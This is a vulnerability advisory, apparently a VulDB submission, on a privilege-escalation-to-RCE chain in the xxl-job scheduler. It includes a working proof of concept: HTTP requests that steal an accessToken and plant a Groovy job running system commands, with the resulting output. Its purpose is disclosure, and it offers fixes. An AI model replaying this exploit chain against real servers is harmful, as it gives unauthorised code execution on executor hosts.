# VulDB Submission — xxl-job Privilege Escalation to Remote Code Execution

---

## Title

**xxl-job up to 3.5.0-SNAPSHOT JobGroupController loadById Endpoint access control [CVE-2026-XXXXX]**

---

## Abstract

A critical vulnerability was found in xxl-job up to version 3.5.0-SNAPSHOT. The vulnerability affects the `loadById` function of the component `JobGroupController`. The manipulation with an unknown input leads to a privilege escalation vulnerability. The attack may be initiated remotely. The complexity of an attack is rather low. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used.

---

## Product

- **Product**: xxl-job
- **Vendor**: xuxueli
- **Website**: https://github.com/xuxueli/xxl-job
- **Affected Version**: <= 3.5.0-SNAPSHOT
- **Component**: JobGroupController / OpenApiController / GlueFactory

---

## Classification

| Type | Value |
|------|-------|
| **CVSS** | 9.8 Critical |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **CWE** | CWE-284 (Improper Access Control) |
| **CWE** | CWE-94 (Improper Control of Generation of Code) |
| **Attack Vector** | Network |
| **Attack Complexity** | Low |
| **Privileges Required** | Low (Normal User Account) |
| **User Interaction** | None |
| **Scope** | Unchanged |
| **Confidentiality** | High |
| **Integrity** | High |
| **Availability** | High |

---

## Introduction

xxl-job is a distributed task scheduling platform widely used in China (10,000+ GitHub stars). A chain of three vulnerabilities allows a normal authenticated user to achieve Remote Code Execution (RCE) on the executor server.

### Attack Chain Overview

```
Normal User Login
    → /jobgroup/loadById (Missing Authentication)
        → Steal accessToken
            → /api/addJob (Hardcoded ADMIN_ROLE)
                → Create malicious GLUE_GROOVY job
                    → GroovyClassLoader.parseClass() (No Sandbox)
                        → Remote Code Execution
```

---

## Vulnerability Details

### Vulnerability 1: Information Disclosure via /jobgroup/loadById

**File**: `xxl-job-admin/src/main/java/com/xxl/job/admin/business/controller/JobGroupController.java`
**Lines**: 239-245

The `@XxlSso(role = Consts.ADMIN_ROLE)` annotation is commented out on the `/jobgroup/loadById` endpoint, allowing any authenticated user (including normal users with role=0) to access the endpoint and retrieve the full `XxlJobGroup` object, which includes the `accessToken` field.

**Vulnerable Code**:
```java
@RequestMapping("/loadById")
@ResponseBody
//@XxlSso(role = Consts.ADMIN_ROLE)    // COMMENTED OUT
public Response<XxlJobGroup> loadById(@RequestParam("id") int id){
    XxlJobGroup jobGroup = xxlJobGroupMapper.load(id);
    return jobGroup!=null?Response.ofSuccess(jobGroup):Response.ofFail();
    // Returns full object including accessToken
}
```

### Vulnerability 2: Hardcoded ADMIN_ROLE in OpenAPI

**File**: `xxl-job-admin/src/main/java/com/xxl/job/admin/business/scheduler/openapi/impl/AdminJobBizImpl.java`
**Lines**: 33-41

The OpenAPI uses a hardcoded `ADMIN_ROLE` LoginInfo for all operations, bypassing all permission checks including jobGroup-level authorization.

**Vulnerable Code**:
```java
private final LoginInfo OPENAPI_LOGIN_INFO = new LoginInfo(
        "0",
        "openapi",
        "OpenAPI",
        null,
        List.of(Consts.ADMIN_ROLE),  // HARDCODED ADMIN_ROLE
        null,
        -1L,
        null);
```

### Vulnerability 3: Groovy Code Execution Without Sandbox

**File**: `xxl-job-core/src/main/java/com/xxl/job/core/glue/GlueFactory.java`
**Lines**: 43, 76

The `GroovyClassLoader.parseClass()` method compiles user-provided Groovy source code without any sandbox restrictions. No `SecureASTCustomizer` or `CompilerConfiguration` is applied, allowing arbitrary Java/Groovy code execution including `Runtime.exec()`.

**Vulnerable Code**:
```java
private final GroovyClassLoader groovyClassLoader = new GroovyClassLoader();

private Class<?> getCodeSourceClass(String codeSource){
    try {
        // ...
        clazz = groovyClassLoader.parseClass(codeSource);  // NO SANDBOX
        // ...
    }
}
```

---

## Proof of Concept

### Prerequisites
- A normal user account (role=0) on xxl-job admin panel

### Step 1: Authenticate as Normal User

```http
POST /auth/doLogin HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

userName=normaluser&password=user123&ifRemember=on
```

**Response**:
```json
{"code":200,"data":null,"msg":"Success","success":true}
```

**Extract Cookie**: `xxl_job_login_token=<session_token>`

### Step 2: Steal accessToken via /jobgroup/loadById

```http
GET /jobgroup/loadById?id=1 HTTP/1.1
Host: target:8080
Cookie: xxl_job_login_token=<session_token>
```

**Response**:
```json
{
  "code": 200,
  "data": {
    "id": 1,
    "appname": "xxl-job-executor-sample",
    "accessToken": "default_token",
    "addressList": "http://executor:9999/",
    "addressType": 0,
    "name": "Sample Executor",
    "registryList": ["http://executor:9999/"]
  },
  "msg": "Success",
  "success": true
}
```

**Extracted**: `accessToken = "default_token"`, `appname = "xxl-job-executor-sample"`

### Step 3: Create Malicious Groovy Job via OpenAPI

```http
POST /api/addJob HTTP/1.1
Host: target:8080
Content-Type: application/json
XXL-JOB-ACCESS-TOKEN: default_token
XXL-JOB-APPNAME: xxl-job-executor-sample

{
  "jobGroup": 1,
  "name": "rce_job",
  "author": "attacker",
  "scheduleType": "CRON",
  "scheduleConf": "0 0/1 * * * ?",
  "misfireStrategy": "DO_NOTHING",
  "executorRouteStrategy": "FIRST",
  "executorHandler": "demoJobHandler",
  "executorBlockStrategy": "SERIAL_EXECUTION",
  "executorTimeout": 0,
  "executorFailRetryCount": 0,
  "glueType": "GLUE_GROOVY",
  "glueSource": "import com.xxl.job.core.handler.IJobHandler\nimport com.xxl.job.core.context.XxlJobHelper\nclass DemoJobHandler extends IJobHandler {\n    @Override\n    public void execute() throws Exception {\n        def proc = [\"cmd\", \"/c\", \"whoami && hostname\"].execute()\n        XxlJobHelper.handleSuccess(proc.text)\n    }\n}",
  "glueRemark": "groovy job"
}
```

**Response**:
```json
{"code":200,"data":"1","msg":"Success","success":true}
```

### Step 4: Start and Trigger the Job

```http
POST /api/startJob HTTP/1.1
XXL-JOB-ACCESS-TOKEN: default_token
XXL-JOB-APPNAME: xxl-job-executor-sample
Content-Type: application/json

{"id": 1}
```

```http
POST /api/triggerJob HTTP/1.1
XXL-JOB-ACCESS-TOKEN: default_token
XXL-JOB-APPNAME: xxl-job-executor-sample
Content-Type: application/json

{"id": 1, "executorParam": ""}
```

### Execution Result (from Executor Logs)

```
2026-07-13 15:09:42 ... glue.version:1720868400000
2026-07-13 15:09:42 ... Result: handleCode=200, handleMsg = RCE_OUTPUT: desktop-e8kmhu9\dayer0
DESKTOP-E8KMHU9
GROOVY_RCE_SUCCESS
```

**Confirmed Impact**:
- Current User: `desktop-e8kmhu9\dayer0`
- Hostname: `DESKTOP-E8KMHU9`
- Arbitrary command execution verified

---

## Impact

An attacker with a normal user account can:

1. **Read arbitrary files** from the executor server
2. **Write arbitrary files** to the executor server
3. **Execute arbitrary system commands** with the privileges of the xxl-job executor process
4. **Establish reverse shells** for persistent access
5. **Pivot to other systems** in the internal network
6. **Exfiltrate sensitive data** from the executor server

---

## Remediation

### Fix 1: Restore Authentication on /jobgroup/loadById

```java
@RequestMapping("/loadById")
@ResponseBody
@XxlSso(role = Consts.ADMIN_ROLE)    // RESTORE THIS LINE
public Response<XxlJobGroup> loadById(@RequestParam("id") int id){
    // ...
}
```

### Fix 2: Remove Hardcoded ADMIN_ROLE from OpenAPI

Replace the hardcoded `OPENAPI_LOGIN_INFO` with permission checks based on the actual `appname` associated with the `accessToken`.

### Fix 3: Implement Groovy Sandbox (Recommended)

Configure `SecureASTCustomizer` on the `GroovyClassLoader` to restrict dangerous imports and method calls.

---

## Timeline

| Date | Event |
|------|-------|
| 2026-07-13 | Vulnerability discovered |
| 2026-07-13 | Vulnerability verified with PoC |
| 2026-07-13 | VulDB submission |
| TBD | Vendor notification |
| TBD | CVE assignment |

---

## References

- **GitHub Repository**: https://github.com/xuxueli/xxl-job
- **Product Website**: https://www.xuxueli.com/xxl-job/
- **CWE-269**: https://cwe.mitre.org/data/definitions/269.html
- **CWE-284**: https://cwe.mitre.org/data/definitions/284.html
- **CWE-94**: https://cwe.mitre.org/data/definitions/94.html

---

## Credits

Security researcher

---

## Disclaimer

This vulnerability was discovered during a security audit of the xxl-job project. The information is provided for defensive purposes only. The author is not responsible for any misuse of this information.
